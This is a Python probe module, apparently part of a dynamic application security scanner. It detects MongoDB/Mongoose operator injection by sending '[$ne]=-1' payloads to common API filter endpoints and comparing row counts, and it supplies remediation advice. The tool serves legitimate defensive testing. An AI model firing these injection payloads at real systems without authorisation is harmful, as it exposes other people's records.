#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
NoSQL operator injection on any filter parameter.

Generalises `nosql_review_operator_injection` (Juice Shop's
`/rest/products/reviews?id[$ne]=-1`). The MongoDB / Mongoose code
shape `Model.find({ id: req.query.id })` is broken across the
entire ecosystem when the request body / query is JSON-parsed:
`?id[$ne]=-1` makes Express's qs parser emit
`{ id: { $ne: '-1' } }`, which Mongoose forwards verbatim, which
matches every record.

High-fidelity signal:
  Comparative row count between literal-id query and
  $ne-operator-injected query. If the operator returns markedly
  more rows than the literal, the filter is being interpreted as
  a Mongo operator.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from urllib.parse import urlencode, urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Endpoints to probe -- common listing routes where filtering by
# a single id / status / type is the typical pattern.
TARGETS = (
    ("/rest/products/reviews", "id"),     # JS literal
    ("/api/products",          "id"),
    ("/api/users",             "id"),
    ("/api/orders",            "status"),
    ("/api/posts",             "id"),
    ("/api/items",             "id"),
    ("/api/notifications",     "id"),
    ("/api/messages",          "id"),
    ("/api/v1/products",       "id"),
)


def _row_count(text: str) -> int | None:
    try:
        doc = json.loads(text or "")
    except (ValueError, json.JSONDecodeError):
        return None
    if isinstance(doc, list):
        return len(doc)
    if isinstance(doc, dict):
        for key in ("data", "items", "results", "rows", "records"):
            v = doc.get(key)
            if isinstance(v, list):
                return len(v)
    return None


class NosqlOperatorInjectionAnyFilterProbe(Probe):
    name = "nosql_operator_injection_any_filter"
    summary = ("Detects NoSQL operator injection on filter "
               "parameters by comparing literal-id and $ne-operator "
               "row counts.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target", action="append", default=[],
            help="Additional path|param (e.g. '/api/foo|id'); repeatable.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(TARGETS)
        for t in args.target or []:
            if "|" in t:
                p, n = t.split("|", 1)
                targets.append((p.strip(), n.strip()))

        attempts: list[dict] = []
        confirmed: dict | None = None
        for path, param in targets:
            url = urljoin(origin, path)
            # Literal-id baseline.
            r_lit = client.request("GET",
                                    url + "?" + urlencode({param: "1"}))
            if r_lit.status != 200 or not r_lit.body:
                attempts.append({"path": path, "param": param,
                                  "status_lit": r_lit.status,
                                  "skipped": True})
                continue
            lit_count = _row_count(r_lit.text)
            if lit_count is None:
                attempts.append({"path": path, "param": param,
                                  "status_lit": r_lit.status,
                                  "non_list": True})
                continue
            # Inject $ne via the qs-parser shape.
            r_op = client.request(
                "GET",
                url + "?" + urlencode({f"{param}[$ne]": "-1"}))
            op_count = (_row_count(r_op.text)
                        if r_op.status == 200 else None)
            row = {"path": path, "param": param,
                    "lit_status": r_lit.status, "lit_count": lit_count,
                    "op_status": r_op.status, "op_count": op_count}
            # Expansion: at least 5x more rows AND at least 5
            # absolute additional rows. The 5x guards against
            # rounding noise; the absolute floor guards against
            # tiny pages where 5x is still low confidence.
            if (op_count is not None and op_count >= 5
                    and op_count >= max(5, 5 * (lit_count or 1))):
                row["operator_injection"] = True
                confirmed = row
                attempts.append(row)
                break
            attempts.append(row)

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(
                    f"Confirmed: NoSQL operator injection at "
                    f"{origin}{confirmed['path']}?{confirmed['param']}"
                    f"[$ne]=-1 returned {confirmed['op_count']} rows "
                    f"vs {confirmed['lit_count']} for the literal "
                    "filter -- the parameter is being interpreted as "
                    "a Mongo operator object."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Cast the parameter to a primitive before passing "
                    "it to the database driver:\n"
                    "  - `Model.find({ id: String(req.query.id) })` -- "
                    "the explicit String() rejects the operator object.\n"
                    "  - Express: enable strict query parsing "
                    "(`app.set('query parser', 'simple')`) so qs no "
                    "longer auto-builds nested objects from "
                    "`?id[$ne]`.\n"
                    "  - Mongoose: schema-validate the field (use "
                    "`SchemaTypes` like `String`, `Number`); the "
                    "validator rejects the operator object on cast.\n"
                    "  - Better: use a typed query builder (Prisma, "
                    "Drizzle) where the parameter type is enforced "
                    "at compile time."),
            )
        return Verdict(
            validated=False, confidence=0.80,
            summary=(f"Refuted: tried {len(attempts)} filter "
                     f"endpoints on {origin}; no $ne-operator "
                     "row-count blow-up observed."),
            evidence=evidence,
        )


if __name__ == "__main__":
    NosqlOperatorInjectionAnyFilterProbe().main()
